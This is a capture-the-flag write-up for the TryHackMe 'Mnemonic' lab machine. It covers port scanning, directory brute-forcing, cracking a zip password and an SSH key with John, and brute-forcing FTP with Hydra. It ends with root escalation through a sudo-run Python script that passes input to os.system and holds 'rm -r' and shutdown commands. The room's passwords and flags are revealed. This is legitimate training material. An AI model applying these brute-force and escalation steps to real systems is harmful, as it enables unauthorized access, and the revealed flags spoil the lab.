# Mnemonic

I hope you have fun.

[Mnemonic](https://tryhackme.com/room/mnemonic)

## Topic's

- Network Enumeration
- Web Poking
- Web Enumeration
- Brute Forcing (Zip)
- Brute Forcing (FTP)
- Brute Forcing (SSH)
- Cryptography
  - Base64
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Mnemonic

Hit me!

You need 1 things : hurry up

https://www.youtube.com/watch?v=pBSR3DyobIY

1.

## Task 2 Enumerate

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ sudo nmap -p- -sS -sC -sV -O 10.10.236.110
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 20:15 CEST
Nmap scan report for 10.10.236.110
Host is up (0.054s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/9%OT=21%CT=1%CU=38235%PV=Y%DS=2%DC=I%G=Y%TM=5F80A92
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.27 seconds
```

1. How many open ports?

`3`

2. what is the ssh port number?

`1337`

3. what is the name of the secret file?

[http://10.10.236.110/robots.txt](http://10.10.236.110/robots.txt)

```
User-agent: *
Allow: /
Disallow: /webmasters/*
```

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ gobuster dir -u http://10.10.236.110/webmasters/ -x php,txt,bak,old -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.236.110/webmasters/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,bak,old
[+] Timeout:        10s
===============================================================
2020/10/09 20:19:20 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.bak (Status: 403)
/.hta.old (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess.old (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.old (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/admin (Status: 301)
/backups (Status: 301)
/index.html (Status: 200)
===============================================================
2020/10/09 20:21:14 Finished
===============================================================
```

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ gobuster dir -u http://10.10.236.110/webmasters/backups/ -x php,txt,bak,old,tar,zip,gz -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.236.110/webmasters/backups/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     bak,old,tar,zip,gz,php,txt
[+] Timeout:        10s
===============================================================
2020/10/09 20:28:39 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.hta.bak (Status: 403)
/.hta.old (Status: 403)
/.hta.tar (Status: 403)
/.hta.zip (Status: 403)
/.hta.gz (Status: 403)
/.hta.php (Status: 403)
/.htaccess (Status: 403)
/.htaccess.old (Status: 403)
/.htaccess.tar (Status: 403)
/.htaccess.zip (Status: 403)
/.htaccess.gz (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.bak (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.tar (Status: 403)
/.htpasswd.zip (Status: 403)
/.htpasswd.gz (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd.old (Status: 403)
/backups.zip (Status: 200)
/index.html (Status: 200)
Progress: 2451 / 4615 (53.11%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/10/09 20:30:15 Finished
===============================================================
```

`10.10.236.110/webmasters/backups/backups.zip`

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ zip2john backups.zip > backups.hash
backups.zip/backups/ is not encrypted!
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8
kali@kali:~/CTFs/tryhackme/Mnemonic$ john backups.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
1g 0:00:00:04 DONE (2020-10-09 20:31) 0.2074g/s 2959Kp/s 2959Kc/s 2959KC/s 0050cent..00257gbjr
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password:
  inflating: backups/note.txt
kali@kali:~/CTFs/tryhackme/Mnemonic$ cat backups/note.txt
@vill

James new ftp username: ftpuser
we have to work hard
kali@kali:~/CTFs/tryhackme/Mnemonic$
```

## Task 3 Credentials

1. ftp user name?

`ftpuser`

2. ftp password?

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.236.110
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-09 20:34:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.236.110:21/
[STATUS] 288.00 tries/min, 288 tries in 00:01h, 14344111 to do in 830:06h, 16 active
[STATUS] 283.67 tries/min, 851 tries in 00:03h, 14343548 to do in 842:45h, 16 active
[21][ftp] host: 10.10.236.110   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-09 20:38:08
```

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ ftp 10.10.236.110
Connected to 10.10.236.110.
220 (vsFTPd 3.0.3)
Name (10.10.236.110:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-1
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-10
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-2
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-3
drwxr-xr-x    4 0        0            4096 Jul 14 18:05 data-4
drwxr-xr-x    2 0        0            4096 Jul 13 21:16 data-5
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-6
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-7
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-8
drwxr-xr-x    2 0        0            4096 Jul 13 21:17 data-9
226 Directory send OK.
ftp>
```

3. What is the ssh username?

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ cat not.txt
james change ftp user password
```

`james`

5. What is the ssh password?

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
kali@kali:~/CTFs/tryhackme/Mnemonic$ john id_rsa.hash  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)
1g 0:00:00:12 DONE (2020-10-09 20:47) 0.08183g/s 1173Kp/s 1173Kc/s 1173KC/sa6_123..*7¡Vamos!
Session completed
kali@kali:~/CTFs/tryhackme/Mnemonic$
```

`bluelove`

6. What is the condor password?

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ ssh james@10.10.236.110 -p 1337
james@10.10.236.110's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct  9 18:51:03 UTC 2020

  System load:  0.0                Processes:           95
  Usage of /:   34.1% of 12.01GB   Users logged in:     0
  Memory usage: 37%                IP address for eth0: 10.10.236.110
  Swap usage:   0%

  => There is 1 zombie process.


51 packages can be updated.
0 updates are security updates.


Last login: Fri Oct  9 18:49:47 2020 from 10.8.106.222
james@mnemonic:~$ ls -la
total 44
drwx------  6 james james 4096 Jul 14 18:20 .
drwxr-xr-x 10 root  root  4096 Jul 14 18:27 ..
-rw-r--r--  1 vill  vill   116 Jul 14 17:56 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14 18:20 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13 19:59 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13 19:59 .bashrc
drwx------  2 james james 4096 Jul 13 22:14 .cache
drwx------  3 james james 4096 Jul 13 22:42 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13 21:34 .local
-rw-r--r--  1 vill  vill   155 Jul 13 20:31 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13 19:59 .profile
drwx------  2 james james 4096 Jul 13 21:16 .ssh
james@mnemonic:~$ cat no-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a2': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash: _upvars: `-a0': invalid number specifier
ls -la
total 44
drwx------  6 james james 4096 Jul 14 18:20 .
drwxr-xr-x 10 root  root  4096 Jul 14 18:27 ..
-rw-r--r--  1 vill  vill   116 Jul 14 17:56 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14 18:20 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13 19:59 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13 19:59 .bashrc
drwx------  2 james james 4096 Jul 13 22:14 .cache
drwx------  3 james james 4096 Jul 13 22:42 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13 21:34 .local
-rw-r--r--  1 vill  vill   155 Jul 13 20:31 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13 19:59 .profile
drwx------  2 james james 4096 Jul 13 21:16 .ssh
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic

I created the condor password. don't forget the beers on saturday
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ ls -la /home/condor
ls: cannot access '/home/condor/..': Permission denied
ls: cannot access '/home/condor/'\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\''': Permission denied
ls: cannot access '/home/condor/.gnupg': Permission denied
ls: cannot access '/home/condor/.bash_logout': Permission denied
ls: cannot access '/home/condor/.bashrc': Permission denied
ls: cannot access '/home/condor/.profile': Permission denied
ls: cannot access '/home/condor/.cache': Permission denied
ls: cannot access '/home/condor/.bash_history': Permission denied
ls: cannot access '/home/condor/.': Permission denied
ls: cannot access '/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
total 0
d????????? ? ? ? ?            ?  .
d????????? ? ? ? ?            ?  ..
d????????? ? ? ? ?            ? 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
l????????? ? ? ? ?            ?  .bash_history
-????????? ? ? ? ?            ?  .bash_logout
-????????? ? ? ? ?            ?  .bashrc
d????????? ? ? ? ?            ?  .cache
d????????? ? ? ? ?            ?  .gnupg
-????????? ? ? ? ?            ?  .profile
d????????? ? ? ? ?            ? ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
james@mnemonic:~$ echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
```

```
kali@kali:~/CTFs/tryhackme/Mnemonic$ cd /opt/
kali@kali:/opt$ sudo git clone https://github.com/MustafaTanguner/Mnemonic.git
[sudo] password for kali:
Cloning into 'Mnemonic'...
remote: Enumerating objects: 52, done.
remote: Counting objects: 100% (52/52), done.
remote: Compressing objects: 100% (51/51), done.
remote: Total 193 (delta 20), reused 0 (delta 0), pack-reused 141
Receiving objects: 100% (193/193), 6.78 MiB | 261.00 KiB/s, done.
Resolving deltas: 100% (88/88), done.
kali@kali:/opt$ python3 -m pip install --user colored
Collecting colored
  Downloading colored-1.4.2.tar.gz (56 kB)
     |████████████████████████████████| 56 kB 316 kB/s
Building wheels for collected packages: colored
  Building wheel for colored (setup.py) ... done
  Created wheel for colored: filename=colored-1.4.2-py3-none-any.whl size=14002 sha256=0febdbac222cf03388aae0eed6790779d79b12152908f557cae95340a272b496
  Stored in directory: /home/kali/.cache/pip/wheels/ae/61/d2/51d0185d88a932058c7341ae08278b27f5312f3667efe433fc
Successfully built colored
Installing collected packages: colored
Successfully installed colored-1.4.2
kali@kali:/opt$ python3 -m pip install --user opencv-python
Collecting opencv-python
  Downloading opencv_python-4.4.0.44-cp38-cp38-manylinux2014_x86_64.whl (49.5 MB)
     |████████████████████████████████| 49.5 MB 1.1 kB/s
Requirement already satisfied: numpy>=1.17.3 in /usr/lib/python3/dist-packages (from opencv-python) (1.17.4)
Installing collected packages: opencv-python
Successfully installed opencv-python-4.4.0.44
kali@kali:/opt$ cd Mnemonic/
kali@kali:/opt/Mnemonic$ python3 Mnemonic.py


ooo        ooooo                                                                o8o
`88.       .888'                                                                `"'
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.
 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P'


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


Access Code image file Path:/data/mnemonic/files/maxresdefault.jpg
File exists and is readable


Processing:0.txt'dir.


*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:
[1804052473695455217[***REDACTED***]00000000000]

(1) ENCRYPT (2) DECRYPT

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:/data/mnemonic/files/6450.txt

pasificbell1981

PRESS TO QUİT 'ENTER' OR 'E' PRESS TO CONTİNUE.
```

`pasificbell1981`

## Task 4 Hack the machine

1. user.txt

```
kali@kali:/opt/Mnemonic$ echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d
THM{a5f82a00e2feee3465249b855be71c01}
```

2. root.txt

```
condor@mnemonic:~$ sudo -l
[sudo] password for condor:
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
condor@mnemonic:~$ ls -l /bin/examplecode.py
-rw-r--r-- 1 root root 2352 Jul 15 15:23 /bin/examplecode.py
```

```py
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print


    print("""

    ------------information systems script beta--------
    ---------------------------------------------------
    ---------------------------------------------------
    ---------------------------------------------------
    ---------------------------------------------------
    ---------------------------------------------------
    ---------------------------------------------------
    ----------------@author villwocki------------------""")
    time.sleep(2)
    print("\nRunning...")
    time.sleep(2)
    os.system(command="clear")
    main()


def main():
    info()
    while True:
        select = int(input("\nSelect:"))

        if select == 1:
            time.sleep(1)
            print("\nRunning")
            time.sleep(1)
            x = os.system(command="ip a")
            print("Main Menü press '0' ")
            print(x)

        if select == 2:
            time.sleep(1)
            print("\nRunning")
            time.sleep(1)
            x = os.system(command="ifconfig")
            print(x)

        if select == 3:
            time.sleep(1)
            print("\nRunning")
            time.sleep(1)
            x = os.system(command="ip route show")
            print(x)

        if select == 4:
            time.sleep(1)
            print("\nRunning")
            time.sleep(1)
            x = os.system(command="cat /etc/os-release")
            print(x)

        if select == 0:
            time.sleep(1)
            ex = str(input("are you sure you want to quit ? yes : "))

            if ex == ".":
                print(os.system(input("\nRunning....")))
            if ex == "yes " or "y":
                sys.exit()


        if select == 5:                     #root
            time.sleep(1)
            print("\nRunning")
            time.sleep(2)
            print(".......")
            time.sleep(2)
            print("System rebooting....")
            time.sleep(2)
            x = os.system(command="shutdown now")
            print(x)

        if select == 6:
            time.sleep(1)
            print("\nRunning")
            time.sleep(1)
            x = os.system(command="date")
            print(x)




        if select == 7:
            time.sleep(1)
            print("\nRunning")
            time.sleep(1)
            x = os.system(command="rm -r /tmp/*")
            print(x)










def info():                         #info print function
    print("""

    #Network Connections   [1]

    #Show İfconfig         [2]

    #Show ip route         [3]

    #Show Os-release       [4]

        #Root Shell Spawn      [5]

        #Print date            [6]

    #Exit                  [0]

    """)

def run(): # run function
    text()

run()
```

```
root@mnemonic:~# cd /root
root@mnemonic:/root# ls
f2.txt  root.txt
root@mnemonic:/root# cat root.txt
THM{congratulationsyoumadeithashme}

kali@kali:~/CTFs/tryhackme/Mnemonic$ echo -n "congratulationsyoumadeithashme" | md5sum
2a4825f50b0c16636984b448669b0586  -

THM{2a4825f50b0c16636984b448669b0586}
```
